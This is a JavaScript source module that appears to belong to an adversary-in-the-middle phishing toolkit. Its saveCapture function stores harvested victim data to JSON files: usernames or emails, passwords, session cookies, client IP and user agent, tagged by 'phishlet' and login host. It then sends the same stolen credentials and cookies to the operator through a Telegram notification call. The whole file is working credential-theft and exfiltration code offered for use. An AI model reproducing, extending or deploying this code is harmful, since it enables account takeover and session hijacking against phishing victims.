import { mkdirSync, writeFileSync } from 'fs';
import { join } from 'path';
import { notifyTelegramCapture } from './telegram.js';

export function ensureCaptureDir(dir) {
  mkdirSync(dir, { recursive: true });
}

export function saveCapture(captureDir, sessionId, payload) {
  ensureCaptureDir(captureDir);
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const base = join(captureDir, `${sessionId}_${stamp}`);
  const out = {
    captured_at: new Date().toISOString(),
    sessionId,
    ...payload,
  };
  writeFileSync(`${base}.json`, JSON.stringify(out, null, 2), 'utf8');
  if (payload.cookies?.length) {
    writeFileSync(`${base}_cookies.json`, JSON.stringify(payload.cookies, null, 2), 'utf8');
  }
  if (!payload.skipTelegram) {
    notifyTelegramCapture({ captureDir, phishletName: payload.phishletName, loginHost: payload.loginHost }, {
      sessionId: payload.sessionId || sessionId,
      username: payload.email || payload.username,
      password: payload.password,
      cookies: payload.cookies,
      url: payload.url,
      clientIp: payload.clientIp,
      userAgent: payload.userAgent,
      custom: payload.custom,
      phishletName: payload.phishletName,
      loginHost: payload.loginHost,
      done: Boolean(payload.cookies?.length),
    }).catch((err) => console.error('[telegram] saveCapture:', err.message));
  }
  return `${base}.json`;
}
